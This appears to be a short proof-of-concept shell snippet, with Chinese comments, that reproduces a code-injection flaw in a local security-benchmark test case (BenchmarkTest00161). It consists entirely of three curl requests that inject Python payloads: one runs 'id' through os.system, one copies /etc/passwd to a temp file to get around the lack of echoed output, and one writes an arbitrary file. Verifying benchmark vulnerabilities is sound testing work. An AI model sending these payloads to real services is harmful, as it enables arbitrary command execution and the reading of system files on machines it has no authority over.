# 复现代码注入 - 执行任意OS命令
curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00161' \
  -d 'BenchmarkTest00161=__import__('\''os'\'').system('\''id'\'')'

# 或输出写入文件以绕过无回显限制
curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00161' \
  -d 'BenchmarkTest00161=__import__('\''os'\'').system('\''cat /etc/passwd > /tmp/out.txt'\'')'

# 任意 Python 代码执行（非仅命令）
curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00161' \
  -d 'BenchmarkTest00161=open("/tmp/evil.txt","w").write("pwned")'